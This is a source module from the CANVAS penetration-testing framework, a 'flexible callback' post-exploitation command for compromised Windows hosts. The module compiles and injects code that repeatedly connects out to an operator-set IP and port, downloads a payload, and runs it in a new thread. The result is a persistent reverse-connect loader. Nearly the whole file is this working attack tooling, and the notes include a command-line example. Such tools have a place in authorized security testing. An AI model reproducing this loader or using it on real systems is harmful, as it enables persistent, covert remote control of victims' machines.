#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: 
    sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit

NAME                    = "Flexible callback"
DESCRIPTION             = "Flexible MOSDEF callbacks"
VERSION                 = "1.0"

PROPERTY                = {}
PROPERTY['TYPE']        = "Commands"
PROPERTY['ARCH']        = [ ["Windows"] ]

DOCUMENTATION           = {}
DOCUMENTATION['Notes']  = """
With this module you can send a MOSDEF callback to a specified location. Optionally
you can make it callback to this location n or infinite times, with a specified
interval.

Listeners set up for flexible callback need the fromcreatethread option set to 1
e.g. ./commandlineInterface.py -v1 -p8080 -i fromcreatethread
"""

NOTES="""
Commandline usage example:

Win32/MOSDEF$ runmodule callbackloop -O callip:172.16.59.1 -O callport:8080 -O callrepeat:2 -O callinterval:20

This would set up a callback to 172.16.59.1 on port 8080, it would sleep 20 seconds between tries and give up
after two repeats.
"""

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.callip         = "127.0.0.1"
        self.callport       = 5001
        self.callrepeat     = 0
        self.callinterval   = 20
        return

    def neededListenerTypes(self): 
        return []

    def callbackLoop(self):
        """ sets up a callback loop thread """
        callbackVars = {}
        
        import socket
        ip = socket.gethostbyname(self.callip)
        ip = str2bigendian(socket.inet_aton(ip))
        
        callbackVars["IP"]          = ip
        callbackVars["PORT"]        = self.callport
        callbackVars["INTERVAL"]    = self.callinterval
        callbackVars["REPEAT"]      = self.callrepeat
        callbackVars["AF_INET"]     = 2

        self.log("[!] attempting callback loop to %s:%d with repeat %d and interval %d"% \
                (self.callip, self.callport, self.callrepeat, self.callinterval))
        
        callbackCode = """
        #include "socket.h"
        
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "IP" as "IP"
        #import "int", "PORT" as "PORT"
        #import "int", "REPEAT" as "REPEAT"

        #import "remote", "ws2_32.dll|connect" as "connect"
        #import "remote", "ws2_32.dll|closesocket" as "closesocket"
        #import "remote", "ws2_32.dll|socket" as "socket"
        #import "remote", "ws2_32.dll|send" as "send"
        #import "remote", "ws2_32.dll|recv" as "recv"
        #import "remote", "kernel32.dll|Sleep" as "Sleep"
        #import "remote", "kernel32.dll|CreateThread" as "CreateThread"
        #import "remote", "kernel32.dll|CloseHandle" as "CloseHandle"
        
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "malloc" as "malloc"
                                
        void callbackLoop(char *ip, int port, int inverval)
        {
            struct sockaddr_in serv_addr;
            char *buf;
            char *push;
            
            int fd;
            int rlen;
            int n;
            int hThread;
            int callCount;
                        
            if (REPEAT == 0)
            {
                callCount = 1;
            }
            else
            {
                callCount = REPEAT;
            }
            
            while(callCount)
            {
                fd = socket(AF_INET, 1, 0);
                serv_addr.family = AF_INET; 
                serv_addr.addr = htonl(ip); // XXX: why doesn't this follow sin_addr.addr semantics ?
                serv_addr.port = htons(port);

                if (connect(fd, &serv_addr, 16) == 0) 
                {
                    // XXX: how are we going to get the fd into esi for MOSDEF ?
                    // XXX: maybe prepend a push fd, pop esi stub to buf ?
                    recv(fd, &rlen, 4, 0);
                    
                    // XXX: make this read redundant ? lacks error check
                    buf = malloc(rlen);

                    n = 0;
                    while(rlen)
                    {
                        n = recv(fd, buf + n, rlen, 0);
                        rlen = rlen - n;
                    }
                    
                    // createthread the MOSDEF thread
                    // XXX: means we need fromcreatethread on listener !!!
                    hThread = CreateThread(0, 0, buf, fd, 0, 0);
                    CloseHandle(hThread);
                }
                else // XXX: prevent leaks
                {
                    closesocket(fd);
                }

                n = INTERVAL;
                while(n)
                {
                    Sleep(1000);
                    n = n - 1;
                }   
         
                if (REPEAT != 0)
                {
                    callCount = callCount - 1;
                }
            }
        }
                    
        void main()
        {
            callbackLoop(IP, PORT, INTERVAL);
        }
        """
        #return self.node.shell.runCode(callbackCode, callbackVars)
        return self.node.shell.compile(callbackCode, callbackVars)

    def localThread(self, code):
        threadVars = {}

        threadVars["CODESIZE"] = len(code)
        threadVars["THREADME"] = code

        threadCode = """
        #import "remote", "kernel32.dll|CreateThread" as "CreateThread"
        #import "remote", "kernel32.dll|CloseHandle" as "CloseHandle"

        #import "local", "sendint" as "sendint"
        #import "local", "malloc" as "malloc"

        #import "int", "CODESIZE" as "CODESIZE"
        #import "string", "THREADME" as "THREADME"

        void main()
        {
            int hThread;
            char *fp;
            char *tp;
            int i;

            fp = malloc(CODESIZE);
            tp = THREADME;

            for (i = 0; i < CODESIZE; i = i + 1)
            {
                fp[i] = tp[i];
            }

            hThread = CreateThread(0, 0, fp, 0, 0, 0);
            if (hThread == 0)
            {
                // failed
                sendint(hThread);
            }
            CloseHandle(hThread);
            sendint(1);
        }
        """
        return self.node.shell.runCode(threadCode, threadVars)

    def getArgs(self):
        """ get all the arguments from the commandline or gui """
        self.callip         = self.argsDict.get("callip", self.callip)
        self.callport       = int(self.argsDict.get("callport", self.callport))
        self.callrepeat     = int(self.argsDict.get("callrepeat", self.callrepeat))
        self.callinterval   = int(self.argsDict.get("callinterval", self.callinterval))
        self.node           = self.argsDict["passednodes"][0]            
        
    def run(self):
        self.getArgs()

        if "win32api" not in self.node.capabilities:
            self.log( "[!] currently only win32 nodes support callback loop ..." )
            return 0

        code    = self.callbackLoop()
        result  = self.localThread(code)
        
        if result:
            self.log( "[!] callback loop started ..." )
        else:
            self.log( "[!] callback loop could not be started ..." )
        
        return result
    

